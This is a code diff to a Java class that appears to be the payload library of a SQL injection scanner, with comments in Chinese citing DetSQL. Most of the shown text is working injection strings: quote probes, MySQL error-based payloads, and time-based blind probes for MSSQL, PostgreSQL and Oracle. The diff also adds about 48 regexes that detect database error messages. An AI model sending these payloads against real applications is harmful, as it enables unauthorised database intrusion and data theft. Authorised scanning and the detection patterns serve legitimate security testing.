@@ -17,7 +17,8 @@ import java.util.stream.Stream;
 
 public final class SqlPayloadLibrary {
    public static final Map<String, List<Pattern>> ERROR_FAMILIES = new LinkedHashMap<>();
-   public static final String[] QUOTE_PROBES = new String[]{"'", "\"", "\\", "''", "`)", "')", "'))"};
+   // v3.10.5：补 DetSQL 混合型引号（数字+引号边界：1'1 / 1"1）
+   public static final String[] QUOTE_PROBES = new String[]{"'", "\"", "\\", "''", "`)", "')", "'))", "1'1", "1\"1"};
    public static final String[] MYSQL_XPATH_PROBES = new String[]{
       "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
       "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
@@ -92,7 +93,7 @@ public final class SqlPayloadLibrary {
       new SqlPayloadLibrary.TimeProbe("'; DECLARE @d VARCHAR(99); SET @d='0:0:{S}'; WAITFOR DELAY @d-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe(" and 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC),
       new SqlPayloadLibrary.TimeProbe("1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC),
-      new SqlPayloadLibrary.TimeProbe("'/**/and/**/1=DBMS_PIPE.RECEIVE_MESSAGE('h',{S})-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING),
+      new SqlPayloadLibrary.TimeProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',{S})='h", "Oracle", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe("' AND 1=DBMS_LOCK.SLEEP({S})-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe(
          "' AND UTL_INADDR.GET_HOST_ADDRESS('tsjan-nonexistent-{S}.invalid')='1'-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING, false
@@ -128,7 +129,7 @@ public final class SqlPayloadLibrary {
       new SqlPayloadLibrary.XrayProbe("');waitfor/**/delay'0:0:{S}'/**/-- ", "MSSQL"),
       new SqlPayloadLibrary.XrayProbe("'/**/and(select'1'from/**/pg_sleep({S}))::text>'0", "PostgreSQL"),
       new SqlPayloadLibrary.XrayProbe("'||(select'1'from/**/pg_sleep({S}))::text||'", "PostgreSQL"),
-      new SqlPayloadLibrary.XrayProbe("'/**/and/**/1=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})-- -", "Oracle")
+      new SqlPayloadLibrary.XrayProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})='{C}'", "Oracle")
    );
    public static final List<SqlPayloadLibrary.XrayProbe> XRAY_STRING_PROBES = List.of(
       new SqlPayloadLibrary.XrayProbe("'and(select*from(select+sleep({S}))a[Space] union [Space]select+1)='", "MySQL"),
@@ -137,7 +138,7 @@ public final class SqlPayloadLibrary {
       new SqlPayloadLibrary.XrayProbe("'/**/and(select'1'from/**/pg_sleep({S}))::text>'0", "PostgreSQL"),
       new SqlPayloadLibrary.XrayProbe("'||(select'1'from/**/pg_sleep({S}))::text||'", "PostgreSQL"),
       new SqlPayloadLibrary.XrayProbe("'and(select+1)>0waitfor/**/delay'0:0:{S}", "MSSQL"),
-      new SqlPayloadLibrary.XrayProbe("'/**/and/**/1=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})-- -", "Oracle"),
+      new SqlPayloadLibrary.XrayProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})='{C}'", "Oracle"),
       new SqlPayloadLibrary.XrayProbe("/**/and/**/{R}=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})", "Oracle")
    );
    public static final List<SqlPayloadLibrary.XrayProbe> XRAY_BARE_ERROR_PROBES = List.of(
@@ -400,6 +401,62 @@ public final class SqlPayloadLibrary {
          "Hibernate", List.of(ci("org\\.hibernate\\.QueryException"), ci("org\\.hibernate\\.exception"), ci("javax\\.persistence"), ci("HqlToken"))
       );
       ERROR_FAMILIES.put("JDBC", List.of(ci("java\\.sql\\.SQLSyntaxErrorException"), ci("java\\.sql\\.SQLException")));
+      // v3.10.1：吸收 DetSQL 细粒度报错正则（约 48 条，含中文/西班牙语/达梦），
+      // 放在族列表末尾：更精确的既有厂商族优先，未命中的再落到本扩展族。
+      ERROR_FAMILIES.put(
+         "SQL扩展",
+         List.of(
+            ci("the\\s+used\\s+select\\s+statements\\s+have\\s+different\\s+number\\s+of\\s+columns"),
+            ci("An\\s+illegal\\s+character\\s+has\\s+been\\s+found\\s+in\\s+the\\s+statement"),
+            ci("MySQL\\s+server\\s+version\\s+for\\s+the\\s+right\\s+syntax\\s+to\\s+use"),
+            ci("supplied\\s+argument\\s+is\\s+not\\s+a\\s+valid\\s+MySQL"),
+            ci("Unclosed\\s+quotation\\s+mark\\s+before\\s+the\\s+character\\s+string"),
+            ci("Column\\s+count\\s+doesn't\\s+match\\s+value\\s+count\\s+at\\s+row"),
+            ci("Column\\s+count\\s+doesn't\\s+match"),
+            ci("Syntax\\s+error\\s+in\\s+string\\s+in\\s+query\\s+expression"),
+            ci("Syntax\\s+error\\s+in\\s+query\\s+expression"),
+            ci("Microsoft\\s+OLE\\s+DB\\s+Provider\\s+for\\s+ODBC\\s+Drivers"),
+            ci("Microsoft\\s+OLE\\s+DB\\s+Provider\\s+for\\s+SQL\\s+Server"),
+            ci("You\\s+have\\s+an\\s+error\\s+in\\s+your\\s+SQL\\s+syntax"),
+            ci("Data\\s+type\\s+mismatch\\s+in\\s+criteria\\s+expression"),
+            ci("Unexpected\\s+end\\s+of\\s+command\\s+in\\s+statement"),
+            ci("has\\s+occurred\\s+in\\s+the\\s+vicinity\\s+of:"),
+            ci("A\\s+Parser\\s+Error\\s+\\(syntax\\s+error\\)"),
+            ci("Procedure\\s+'[^']+'\\s+requires\\s+parameter"),
+            ci("Dynamic\\s+Page\\s+Generation\\s+Error:"),
+            ci("System\\.Data\\.OleDb\\.OleDbException"),
+            ci("Sintaxis\\s+incorrecta\\s+cerca\\s+de"),
+            ci("Table\\s+'[^']+'\\s+doesn't\\s+exist"),
+            ci("your\\s+MySQL\\s+server\\s+version"),
+            ci("ADODB\\.Field\\s+\\(0x800A0BCD\\)"),
+            ci("ADODB\\.Recordset"),
+            ci("(PLS|ORA)-[0-9][0-9][0-9][0-9]"),
+            ci("PostgreSQL\\s+query\\s+failed:"),
+            ci("on\\s+MySQL\\s+result\\s+index"),
+            ci("Dynamic\\s+SQL\\s+Error"),
+            ci("\\[DM_QUERY_E_SYNTAX\\]"),
+            ci("mysql_fetch_array\\(\\)"),
+            ci("pg_query\\(\\)\\s+\\[:"),
+            ci("pg_exec\\(\\)\\s+\\[:"),
+            ci("\\[MySQL\\]\\[ODBC"),
+            ci("\\[SQL Server\\]"),
+            ci("\\[SqlException"),
+            ci("SQLSTATE=\\d+"),
+            ci("odbc_exec\\(\\)"),
+            ci("Oracle\\s+error"),
+            ci("\\[Microsoft\\]\\[ODBC\\s+Microsoft\\s+Access\\s+Driver\\]"),
+            ci("Microsoft\\s+SQL\\s+Native\\s+Client\\s+error"),
+            ci("mysqli_\\w+\\(\\)"),
+            ci("mysql_result\\(\\)"),
+            ci("pg_fetch_\\w+\\(\\)"),
+            ci("pg_num_rows\\(\\)"),
+            ci("oci_fetch_\\w+\\(\\)"),
+            ci("SQLite3::query"),
+            ci("Unterminated\\s+string\\s+literal"),
+            ci("syntax\\s+error\\s+at\\s+end\\s+of\\s+input"),
+            ci("数据库出错")
+         )
+      );
    }
 
    public record BoolPair(String truePayload, String falsePayload, String label) {
